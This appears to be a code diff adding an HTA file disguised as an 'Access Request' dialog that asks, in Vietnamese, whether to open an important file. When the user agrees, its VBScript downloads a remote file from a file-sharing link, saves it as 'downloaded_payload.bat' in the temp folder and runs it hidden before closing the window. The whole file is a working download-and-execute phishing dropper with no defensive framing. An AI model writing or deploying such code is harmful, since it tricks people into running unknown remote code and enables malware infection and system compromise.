@@ -1,0 +1,51 @@
+<html>
+<head>
+    <title>Access Request</title>
+    <hta:application id="oHTA"
+        border="thin"
+        maximizeButton="no"
+        minimizeButton="no"
+        showInTaskbar="no"
+        sysMenu="no"
+        caption="no" />
+    <script language="VBScript">
+    Sub Window_OnLoad()
+        Dim ans
+        ans = MsgBox("Bạn có muốn mở file quan trọng không?", vbYesNo + vbQuestion, "Access Request")
+        If ans = vbYes Then
+            DownloadAndRun "https://2011.filemail.com/api/file/get?filekey=yS8RsSS5s5PmvglQhhZQg8Z-3ceo8192mZxMzRKndrcS-R4HXfp4-Gg3q_k&pk_vid=dce56cdd8c3154be17499677070eef7d"
+        Else
+            self.close
+        End If
+    End Sub
+
+    Sub DownloadAndRun(url)
+        Dim xhr, fso, tempPath, filePath, shell
+        Set xhr = CreateObject("MSXML2.XMLHTTP")
+        xhr.Open "GET", url, False
+        xhr.Send
+        If xhr.Status = 200 Then
+            Set fso = CreateObject("Scripting.FileSystemObject")
+            tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
+            filePath = tempPath & "\downloaded_payload.bat" 
+            If fso.FileExists(filePath) Then fso.DeleteFile filePath, True
+            Dim stream
+            Set stream = CreateObject("ADODB.Stream")
+            stream.Type = 1 'binary
+            stream.Open
+            stream.Write xhr.responseBody
+            stream.SaveToFile filePath, 2 'overwrite
+            stream.Close
+            Set shell = CreateObject("WScript.Shell")
+            shell.Run Chr(34) & filePath & Chr(34), 0, False ' 0=hidden, False=do not wait
+            self.close
+        Else
+            MsgBox "Download failed: " & xhr.Status, vbExclamation, "Error"
+            self.close
+        End If
+    End Sub
+    </script>
+</head>
+<body>
+</body>
+</html>
